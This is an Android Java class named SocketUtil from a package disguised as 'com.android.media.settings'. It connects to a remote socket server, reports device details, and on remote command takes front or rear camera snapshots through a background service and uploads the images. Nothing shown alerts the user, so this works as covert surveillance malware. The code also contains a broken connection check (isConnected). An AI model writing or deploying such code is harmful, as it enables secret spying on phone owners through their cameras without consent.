package com.android.media.settings.Utility;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Camera;
import android.os.Handler;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

import com.android.media.settings.MediaConfig;
import com.android.media.settings.Model.DeviceActivity;
import com.android.media.settings.Model.DeviceActivityResponse;
import com.android.media.settings.Model.Media;
import com.android.media.settings.Model.Property;
import com.android.media.settings.Service.CamService;
import com.google.gson.Gson;

import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLEncoder;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class SocketUtil {
    private static final String TAG = SocketUtil.class.getSimpleName();

    private static final String EVENT_JOIN = "join";
    private static final String EVENT_ON_ACTIVITY = "onActivity";
    private static final String EVENT_ACTIVITY_RESPONSE = "activityResponse";

    public static final String ACTIVITY_SNAP_FRONT = "snapFront";
    public static final String ACTIVITY_SNAP_REAR = "snapRear";
    public static final String ACTIVITY_SNAP = "userSnap";
    public static final String ACTIVITY_RESET = "stopCamService";

    private static Socket mSocket; {
        try {
            mSocket = IO.socket(MediaConfig.SOCKET_SERVER_URL);
        } catch (URISyntaxException e) { e.printStackTrace(); }
    }
    private Context context;
    private Handler handler;
    private MediaUtility mMediaUtility;
    private String deviceId;
    public static boolean isConnected;

    public SocketUtil(Context context) {
        this.context = context;
        isConnected = false;
        handler = new Handler();
        mMediaUtility = MediaUtility.getInstance(context);
        LocalBroadcastManager.getInstance(context).registerReceiver(receiver, new IntentFilter("CamServiceUpdates"));
    }

    private static SocketUtil mSocketUtil;
    public static synchronized SocketUtil getInstance(Context context) {
        if(mSocketUtil == null) {
            mSocketUtil = new SocketUtil(context);
        }
        return mSocketUtil;
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    public boolean connect() {
        if(mSocket != null && !mSocket.connected()) {
            Log.d(TAG, "Connecting to MediaStore...");
            mSocket.on(Socket.EVENT_CONNECT, onConnect);
            mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
            mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
            mSocket.on(Socket.EVENT_ERROR, onError);
            mSocket.on(Socket.EVENT_DISCONNECT, onError);
            mSocket.on(EVENT_ON_ACTIVITY, onActivity);
            mSocket.connect();
        }
        return this.isConnected();
    }

    public boolean isConnected() {
        try {
            return mSocket == null && mSocket.connected();
        } catch (NullPointerException e) {
            return false;
        }
    }

    private Emitter.Listener onConnect = (Object... args) -> {
        Log.d(TAG, "Device Connected");
        isConnected = true;
        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
        try {
            response = URLEncoder.encode(response, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        mSocket.emit(EVENT_JOIN, response);
    };

    private Emitter.Listener onError = (Object... args) -> {
        isConnected = false;
        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
        try {
            response = URLEncoder.encode(response, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        mSocket.emit(EVENT_JOIN, response);
    };

    private Emitter.Listener onActivity = (Object... args) -> {
        Object obj = args[0];
        Log.d(TAG, obj.toString());
        DeviceActivity activity = DeviceActivity.fromJson(obj.toString());
        deviceId = activity.getDeviceId();
        processActivity(activity);
    };

    private void captureImage(Property prop) {
        if(!CameraUtility.isCameraExist(context)) {
            return;
        }
        CamService.takeSnap(context, prop);
    }

    private void processActivity(DeviceActivity activity) {
        Log.d(TAG, "Activity Triggered " + activity.getName());
        switch (activity.getName()) {
            case ACTIVITY_SNAP: case ACTIVITY_SNAP_FRONT: case ACTIVITY_SNAP_REAR:
                captureImage(activity.getProperty());
                break;

            case ACTIVITY_RESET:
                context.stopService(new Intent(context, CamService.class));
                break;
        }
    }

    private void emitImage(String byteString) {
        Media media = new Media(byteString);
        DeviceActivityResponse response = new DeviceActivityResponse(ACTIVITY_SNAP, deviceId, media);
        mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
    }

    private BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            byte[] bytes = intent.getByteArrayExtra("ImageBytes");
            emitImage(mMediaUtility.compressByteImage(bytes));
        }
    };

    public void disconnect() {
        if(mSocket.connected()) {
            mSocket.disconnect();
            mSocket.off(Socket.EVENT_CONNECT, onConnect);
            mSocket.off(Socket.EVENT_CONNECT_ERROR, onError);
            mSocket.off(Socket.EVENT_CONNECT_TIMEOUT, onError);
            mSocket.off(Socket.EVENT_ERROR, onError);
            mSocket.off(Socket.EVENT_DISCONNECT, onError);
            mSocket.off(EVENT_ON_ACTIVITY, onActivity);
        }
    }
}
